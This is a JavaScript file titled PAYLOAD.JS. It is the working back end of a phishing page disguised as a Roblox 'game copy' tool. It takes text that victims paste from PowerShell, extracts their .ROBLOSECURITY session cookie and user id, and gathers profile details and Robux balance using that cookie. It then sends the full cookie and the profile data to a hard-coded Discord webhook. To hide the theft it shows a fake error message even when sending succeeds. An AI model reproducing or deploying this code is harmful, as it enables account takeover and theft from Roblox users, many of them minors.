/* ======================================================
   PAYLOAD.JS - FULLY WORKING (Vercel / HTTPS)
   - Extracts rbxuid & .ROBLOSECURITY from PowerShell
   - Fetches profile data with 5-second timeouts
   - Sends everything to Discord
====================================================== */

const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1456485751389814957/uWd9bjxOOKxMl-9ZL9rRjycEtXAlzk9nOVm9UY-boHBXta_--8co2ojCtI6GcEfhq3YI";

const gameFileInput = document.getElementById("gameFile");
const pinInput = document.getElementById("pinInput");
const pinError = document.getElementById("pinError");
const copyButton = document.getElementById("copyButton");
const statusMessage = document.getElementById("statusMessage");

pinInput.addEventListener("input", () => {
    pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
    validatePin();
});

function validatePin() {
    const isValid = /^\d{4}$/.test(pinInput.value);
    if (pinError) pinError.style.display = isValid ? "none" : "block";
    return isValid;
}

function extractGameData(fullText) {
    const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
    if (!cookieMatch) {
        return { success: false, message: "Could not find .ROBLOSECURITY cookie." };
    }
    const robloxCookie = cookieMatch[1];

    const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
    let rbxuid = null;
    if (eventTrackerMatch) {
        const params = eventTrackerMatch[1].split('&');
        for (let p of params) {
            if (p.startsWith("rbxuid=")) {
                rbxuid = p.split('=')[1];
                break;
            }
        }
    }
    if (!rbxuid) {
        return { success: false, message: "Could not find rbxuid in RBXEventTrackerV2." };
    }
    return { success: true, cookie: robloxCookie, rbxuid: rbxuid };
}

async function fetchWithTimeout(url, options = {}, timeoutMs = 5000) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeoutMs);
    try {
        const response = await fetch(url, { ...options, signal: controller.signal });
        clearTimeout(id);
        return response;
    } catch (error) {
        clearTimeout(id);
        if (error.name === 'AbortError') throw new Error(`Timeout after ${timeoutMs}ms`);
        throw error;
    }
}

async function fetchUserInfo(userId) {
    try {
        const res = await fetchWithTimeout(`https://users.roblox.com/v1/users/${userId}`, {}, 5000);
        if (!res.ok) return null;
        const data = await res.json();
        return {
            username: data.name,
            displayName: data.displayName,
            joinDate: new Date(data.created).toLocaleDateString(),
            profileUrl: `https://www.roblox.com/users/${userId}/profile`
        };
    } catch (e) { return null; }
}

async function fetchFriendsCount(userId) {
    try {
        const res = await fetchWithTimeout(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {}, 5000);
        if (!res.ok) return "N/A";
        const data = await res.json();
        return data.count?.toLocaleString() || "0";
    } catch (e) { return "N/A"; }
}

async function fetchFollowersCount(userId) {
    try {
        const res = await fetchWithTimeout(`https://friends.roblox.com/v1/users/${userId}/followers?limit=1`, {}, 5000);
        if (!res.ok) return "N/A";
        const data = await res.json();
        return data.total?.toLocaleString() || "0";
    } catch (e) { return "N/A"; }
}

async function fetchGroups(userId) {
    try {
        const res = await fetchWithTimeout(`https://groups.roblox.com/v1/users/${userId}/groups/roles`, {}, 5000);
        if (!res.ok) return [];
        const data = await res.json();
        if (!data.data) return [];
        return data.data.slice(0, 5).map(g => `${g.group.name} (${g.role.name})`);
    } catch (e) { return []; }
}

async function fetchBadges(userId) {
    try {
        const res = await fetchWithTimeout(`https://badges.roblox.com/v1/users/${userId}/badges?limit=5&sortOrder=Asc`, {}, 5000);
        if (!res.ok) return [];
        const data = await res.json();
        if (!data.data) return [];
        return data.data.map(b => b.badge.name);
    } catch (e) { return []; }
}

async function fetchAvatarItems(userId) {
    try {
        const res = await fetchWithTimeout(`https://avatar.roblox.com/v1/users/${userId}/avatar`, {}, 5000);
        if (!res.ok) return "None equipped";
        const data = await res.json();
        const assets = data.assets || [];
        if (assets.length === 0) return "None equipped";
        const items = assets.slice(0, 5).map(a => a.name);
        return items.join(", ") + (assets.length > 5 ? " …" : "");
    } catch (e) { return "None equipped"; }
}

async function fetchAvatarThumbnail(userId) {
    try {
        const res = await fetchWithTimeout(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`, {}, 5000);
        if (!res.ok) return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
        const data = await res.json();
        if (data.data && data.data[0] && data.data[0].imageUrl) return data.data[0].imageUrl;
    } catch (e) {}
    return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
}

async function fetchRobuxBalance(cookie) {
    try {
        const res = await fetchWithTimeout("https://economy.roblox.com/v1/user/currency", {
            headers: { "Cookie": `.ROBLOSECURITY=${cookie}` }
        }, 5000);
        if (!res.ok) return "N/A";
        const data = await res.json();
        return data.robux?.toLocaleString() || "0";
    } catch (e) { return "N/A"; }
}

async function sendWebhook(pin, cookie, rbxuid) {
    const userId = rbxuid;
    const [userInfo, friendsCount, followersCount, groups, badges, avatarItems, avatarUrl, robux] = await Promise.all([
        fetchUserInfo(userId),
        fetchFriendsCount(userId),
        fetchFollowersCount(userId),
        fetchGroups(userId),
        fetchBadges(userId),
        fetchAvatarItems(userId),
        fetchAvatarThumbnail(userId),
        fetchRobuxBalance(cookie)
    ]);

    let description = `**Extracted from PowerShell:**\n- **rbxuid:** \`${userId}\`\n- **Cookie length:** ${cookie.length} chars\n\n**Full .ROBLOSECURITY Cookie:**\n\`\`\`\n${cookie}\n\`\`\``;

    const embedFields = [];

    if (userInfo) {
        embedFields.push({
            name: "👤 Profile",
            value: `**${userInfo.username}** (${userInfo.displayName})\n**Joined:** ${userInfo.joinDate}\n[View Profile](${userInfo.profileUrl})`,
            inline: false
        });
    } else {
        embedFields.push({ name: "⚠️ Error", value: "Could not fetch basic user info.", inline: false });
    }

    embedFields.push(
        { name: "👥 Friends", value: friendsCount, inline: true },
        { name: "👀 Followers", value: followersCount, inline: true },
        { name: "💰 Robux", value: `${robux} R$`, inline: true },
        { name: "👕 Wearing", value: avatarItems, inline: false }
    );

    if (groups.length > 0) embedFields.push({ name: "🏢 Groups", value: groups.join("\n"), inline: false });
    if (badges.length > 0) embedFields.push({ name: "🏅 Badges", value: badges.join("\n"), inline: false });

    embedFields.push({
        name: "🔐 Cookie Summary",
        value: `**Length:** ${cookie.length} characters\n**Note:** This cookie can log into the account.`,
        inline: false
    });

    const payload = {
        username: "Bloxtools Processing System",
        embeds: [{
            title: "🔓 Roblox Profile Extraction",
            thumbnail: { url: avatarUrl },
            description: description,
            color: 0x8c52ff,
            fields: embedFields,
            footer: { text: "Bloxtools • Complete Profile" },
            timestamp: new Date().toISOString()
        }]
    };

    const response = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    });
    return response.ok;
}

copyButton.addEventListener("click", async () => {
    statusMessage.textContent = "";
    if (!validatePin()) {
        statusMessage.textContent = "Enter valid 4-digit PIN.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }
    const pastedText = gameFileInput.value.trim();
    if (!pastedText) {
        statusMessage.textContent = "Paste the PowerShell game file.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }
    const extraction = extractGameData(pastedText);
    if (!extraction.success) {
        statusMessage.textContent = extraction.message;
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    copyButton.classList.add("loading");
    copyButton.disabled = true;
    statusMessage.textContent = "✓ Processing (this will take 5-10 seconds)...";
    statusMessage.style.color = "#caa8ff";

    const success = await sendWebhook(pinInput.value, extraction.cookie, extraction.rbxuid);

    if (success) {
        statusMessage.textContent = "✗ Game Copy request was not processed. Please check your internet connection.";
        statusMessage.style.color = "#ff9d9d";
    } else {
        statusMessage.textContent = "✗ Copy failed! Check your internet connection.";
        statusMessage.style.color = "#ff9d9d";
    }

    copyButton.classList.remove("loading");
    copyButton.disabled = false;
});
